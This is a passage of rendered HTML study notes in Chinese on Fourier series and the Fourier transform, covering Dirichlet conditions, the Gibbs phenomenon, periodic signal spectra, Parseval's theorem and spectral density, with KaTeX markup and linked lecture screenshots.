mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mord mathdefault">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3343759999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:2em;"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord cjk_fallback">广</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">傅</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">叶</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">数</span></span></span></span></span></p><p>推广具体，令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\varphi_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为三角函数集</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001154528732.png" alt="image-20221001154528732" style="zoom: 50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001154612057.png" alt="image-20221001154612057" style="zoom: 50%;" /><h3 id="狄里赫利-dirichlet-条件">狄里赫利(Dirichlet)条件</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155223271.png" alt="image-20221001155223271" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155238503.png" alt="image-20221001155238503" style="zoom:33%;" /><p>间断点为第一类间断点：一个信号在这点间断，但左右导数存在</p><h3 id="余弦形式的傅里叶级数">余弦形式的傅里叶级数</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155710589.png" alt="image-20221001155710589" style="zoom: 50%;" /><h4 id="例题">例题</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160013251.png" alt="image-20221001160013251"  /><p>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>是奇函数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a_{n}=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160115260.png" alt="image-20221001160115260"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160319854.png" alt="image-20221001160319854"></p><h4 id="吉布斯现象">吉布斯现象</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160346217.png" alt="image-20221001160346217"></p><h3 id="波形的对称性和谐波特性">波形的对称性和谐波特性</h3><h4 id="对称性">对称性</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165450041.png" alt="image-20221001165450041"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165430915.png" alt="image-20221001165430915"></p><h4 id="谐波性">谐波性</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165520416.png" alt="image-20221001165520416"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165548907.png" alt="image-20221001165548907"></p><h2 id="指数形式的傅里叶级数">指数形式的傅里叶级数</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001173647416.png" alt="image-20221001173647416"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172438805.png" alt="image-20221001172438805"></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>因为</mtext><mi>n</mi><mo>=</mo><mn>0</mn><mtext>时，为</mtext><mfrac><msub><mi>A</mi><mn>0</mn></msub><mn>2</mn></mfrac><mtext>；</mtext><mi>n</mi><mtext>为</mtext><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>和</mtext><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo><mtext>正好构成</mtext><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo><mtext>，所以可以合在一起</mtext></mrow><annotation encoding="application/x-tex">因为n=0时，为\frac{A_{0}}{2}；n为(-\infty,-1)和(1,+\infty)正好构成(-\infty,+\infty)，所以可以合在一起</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.233431em;vertical-align:-0.345em;"></span><span class="mord">0</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8884309999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord cjk_fallback">；</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">为</span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">成</span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">起</span></span></span></span></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172519381.png" alt="image-20221001172519381"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172858648.png" alt="image-20221001172858648" style="zoom: 50%;" /><h4 id="例题">例题</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001173239425.png" alt="image-20221001173239425"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001174203167.png" alt="image-20221001174203167"></p><h2 id="傅里叶系数之间的关系">傅里叶系数之间的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001180513079.png" alt="image-20221001180513079" style="zoom: 50%;" />$$2|F_{n}|=A_{n}$$<h1>周期信号的频谱</h1><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211253730.png" alt="image-20221001211253730"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211358246.png" alt="image-20221001211358246"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211416406.png" alt="image-20221001211416406"></p><h2 id="例题1">例题1</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211457037.png" alt="image-20221001211457037"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211609782.png" alt="image-20221001211609782"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211525552.png" alt="image-20221001211525552"></p><h2 id="例题2">例题2</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102758736.png" alt="image-20221002102758736" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102840282.png" alt="image-20221002102840282" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102943627.png" alt="image-20221002102943627" style="zoom:67%;" /><h2 id="频谱的特点">频谱的特点</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002110156885.png" alt="image-20221002110156885" style="zoom: 50%;" />$$\textcolor{red}{因为Sa(x)=\frac{sinx}{x}，所以F_{n}=\frac{\tau}{T}Sa(\frac{n\Omega\tau}{2})}$$<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002110950896.png" alt="image-20221002110950896" style="zoom:50%;" /><h3 id="频谱的特点">频谱的特点</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111050215.png" alt="image-20221002111050215"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113935706.png" alt="image-20221002113935706" style="zoom:50%;" /><h3 id="tau和t变化关系"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>变化关系</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111338972.png" alt="image-20221002111338972" style="zoom:50%;" /><p>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>不变，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span>变小时，周期不变，脉冲宽度变窄。幅度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>τ</mi><mi>T</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{\tau}{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>下降；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">\Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ω</span></span></span></span>不变；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>2</mn><mi>m</mi><mi>π</mi></mrow><mi>τ</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{2m\pi}{\tau}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>零点增大导致零点间远移，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>T</mi><mi>τ</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{T}{\tau}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>两零点间谱线数增多。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111402152.png" alt="image-20221002111402152" style="zoom:50%;" /><p><font color="red">傅里叶级数向傅里叶变换的节点，非周期信号周期为1，下一周期在无穷远处。</font></p><h3 id="收敛性分析">收敛性分析</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113612829.png" alt="image-20221002113612829" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113639399.png" alt="image-20221002113639399" style="zoom:50%;" /><h3 id="平均功率-parseval等式">平均功率——Parseval等式</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002140515705.png" alt="image-20221002140515705" style="zoom:50%;" /><p>表明：对于周期信号，在时域中求得的信号功率与在频域中求得的信号功率相等。</p><h3 id="频带宽度">频带宽度</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002114502516.png" alt="image-20221002114502516" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002114522013.png" alt="image-20221002114522013" style="zoom:50%;" /><p>例题</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151518586.png" alt="image-20221002151518586" style="zoom:50%;" /><h1>非周期信号傅里叶变换</h1><h2 id="非周期信号的频谱">非周期信号的频谱</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151600985.png" alt="image-20221002151600985" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151632167.png" alt="image-20221002151632167" style="zoom:50%;" /><p>注意：虽然各频率分量的幅度趋近于无穷小，但无穷小量之间仍有相对大小差别，故引入频谱密度函数。</p><h2 id="频谱密度函数">频谱密度函数</h2><p>​<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151801570.png" alt="image-20221002151801570" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002152154234.png" alt="image-20221002152154234" style="zoom:50%;" /></p><p>​<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002152239108.png" alt="image-20221002152239108" style="zoom: 33%;" /></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="red"><msub><mi>F</mi><mi>n</mi></msub><mtext>频谱是实际频谱大小，</mtext><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>为非周期信号的频谱，将无穷小放大为无穷大倍，实际为频谱密度</mtext></mstyle></mrow><annotation encoding="application/x-tex">\textcolor{red}{F_{n}频谱是实际频谱大小，F(j\omega)为非周期信号的频谱，将无穷小放大为无穷大倍，实际为频谱密度}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord" style="color:red;"><span class="mord mathdefault" style="margin-right:0.13889em;color:red;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight" style="color:red;"><span class="mord mtight" style="color:red;"><span class="mord mathdefault mtight" style="color:red;">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback" style="color:red;">频</span><span class="mord cjk_fallback" style="color:red;">谱</span><span class="mord cjk_fallback" style="color:red;">是</span><span class="mord cjk_fallback" style="color:red;">实</span><span class="mord cjk_fallback" style="color:red;">际</span><span class="mord cjk_fallback" style="color:red;">频</span><span class="mord cjk_fallback" style="color:red;">谱</span><span class="mord cjk_fallback" style="color:red;">大</span><span class="mord cjk_fallback" style="color:red;">小</span><span class="mord cjk_fallback" style="color:red;">，</span><span class="mord mathdefault" style="margin-right:0.13889em;color:red;">F</span><span class="mopen" style="color:red;">(</span><span class="mord mathdefault" style="margin-right:0.05724em;color:red;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;color:red;">ω</span><span class="mclose" style="color:red;">)</span><span class="mord cjk_fallback" style="color:red;">为</span><span class="mord cjk_fallback" style="color:red;">非</span><span class="mord cjk_fallback" style="color:red;">周</span><span class="mord cjk_fallback" style="color:red;">期</span><span class="mord cjk_fallback" style="color:red;">信</span><span class="mord cjk_fallback" style="color:red;">号</span><span class="mord cjk_fallback" style="color:red;">的</span><span class="mord cjk_fallback" style="color:red;">频</span><span class="mord cjk_fallback" style="color:red;">谱</span><span class="mord cjk_fallback" style="color:red;">，</span><span class="mord cjk_fallback" style="color:red;">将</span><span class="mord cjk_fallback" style="color:red;">无</span><span class="mord cjk_fallback" style="color:red;">穷</span><span class="mord cjk_fallback" style="color:red;">小</span><span class="mord cjk_fallback" style="color:red;">放</span><span class="mord cjk_fallback" style="color:red;">大</span><span class="mord cjk_fallback" style="color:red;">为</span><span class="mord cjk_fallback" style="color:red;">无</span><span class="mord cjk_fallback" style="color:red;">穷</span><span class="mord cjk_fallback" style="color:red;">大</span><span class="mord cjk_fallback" style="color:red;">倍</span><span class="mord cjk_fallback" style="color:red;">，</span><span class="mord cjk_fallback" style="color:red;">实</span><span class="mord cjk_fallback" style="color:red;">际</span><span class="mord cjk_fallback" style="color:red;">为</span><span class="mord cjk_fallback" style="color:red;">频</span><span class="mord cjk_fallback" style="color:red;">谱</span><span class="mord cjk_fallback" style="color:red;">密</span><span class="mord cjk_fallback" style="color:red;">度</span></span></span></span></span></p><h2 id="傅里叶变换">傅里叶变换</h2><h3 id="傅里叶正变换f-t-rightarrow-f-j-omega">傅里叶正变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>→</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t) \rightarrow F(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002163527904.png" alt="image-20221002163527904"></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>周期函数：</mtext><msub><mi>F</mi><mi>n</mi></msub><mi mathvariant="normal">/</mi><msub><mi>A</mi><mi>n</mi></msub><mo>∼</mo><mi mathvariant="normal">Ω</mi><mspace linebreak="newline"></mspace><mtext>非周期函数：</mtext><mi mathvariant="normal">∣</mi><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">/</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>ω</mi><mo stretchy="false">)</mo><mo>∼</mo><mi>ω</mi></mrow><annotation encoding="application/x-tex">周期函数：F_{n}/A_{n}\sim\Omega\\非周期函数：|F(j\omega)|/\varphi(\omega)\sim\omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">周</span><span class="mord cjk_fallback">期</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ω</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">周</span><span class="mord cjk_fallback">期</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">/</span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span></span></span></span></span></p><h3 id="傅里叶反变换f-j-omega-rightarrow-f-t">傅里叶反变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mo>→</mo><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(j\omega)\rightarrow f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord 